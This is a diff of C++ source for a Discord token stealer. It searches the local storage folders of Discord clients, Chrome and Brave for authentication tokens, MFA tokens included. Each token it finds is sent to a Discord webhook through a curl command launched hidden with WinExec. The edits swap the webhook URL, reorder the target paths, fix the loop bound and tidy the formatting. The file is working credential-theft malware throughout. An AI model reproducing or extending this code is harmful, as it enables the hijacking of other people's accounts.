@@ -11,7 +11,7 @@ namespace fs = std::filesystem;
 std::string send_token(std::string token) {
 
 	char cmd[1024];
-	sprintf(cmd, "curl -d \"content=%s\" https://discord.com/api/webhooks/WEBHOOKHERE >nul", token.c_str());
+	sprintf(cmd, "curl -d \"content=%s\" https://discord.com/x >nul", token.c_str());
 	WinExec(cmd, SW_HIDE);
 
 	return cmd;
@@ -50,29 +50,30 @@ int main() {
 
 	// Finding token
 
-	std::vector<std::string> installs = { "\\discordptb\\Local Storage\\leveldb", "\\discordcanary\\Local Storage\\leveldb", "\\Lightcord\\Local Storage\\leveldb", "\\Discord\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"};
+	std::vector<std::string> installs = { "\\Lightcord\\Local Storage\\leveldb", "\\Discord\\Local Storage\\leveldb", "\\discordptb\\Local Storage\\leveldb", "\\discordcanary\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb" };
 
-	for (int i = 0; i < 6; i++) { // 
+	for (int i = 0; i < installs.size(); i++) { // 
 		std::string path;
-		if(i > 3) {
+		if (i > 3) {
 			path = std::getenv("localappdata") + installs[i];
-		} else {
+		}
+		else {
 			path = std::getenv("appdata") + installs[i];
 		}
-		
+
 		// Temporary logging file
-		
+
 		char szLogFile[MAX_PATH];
-		sprintf(szLogFile,"%s\\LOGS.LOG",std::getenv("appdata"));
-		
-		std::ofstream logging_file(szLogFile,std::ios::app);
-		
+		sprintf(szLogFile, "%s\\LOGS.LOG", std::getenv("appdata"));
+
+		std::ofstream logging_file(szLogFile, std::ios::app);
+
 		logging_file << "\nCurrent directory: " << path;
-		
+
 		logging_file.close();
-		
+
 		// End
-		
+
 		for (const auto& entry : fs::directory_iterator(path)) {
 			std::ifstream t(entry.path(), std::ios_base::binary);
 
@@ -83,16 +84,16 @@ int main() {
 
 			std::vector<std::string> regex_non_mfa = findMatch(str, expression); // NightfallGT for this function
 			std::vector<std::string> regex_mfa = findMatch(str, expression2); // NightfallGT for this function
-			
-			
+
+
 			for (int i = 0; i < regex_non_mfa.size(); i++) {
 				matches.push_back(regex_non_mfa[i]);
 			}
-			
+
 			for (int i = 0; i < regex_mfa.size(); i++) {
 				matches.push_back(regex_mfa[i]);
 			}
-			
+
 			for (int i = 0; i < matches.size(); i++) {
 				send_token(matches[i]);
 			}
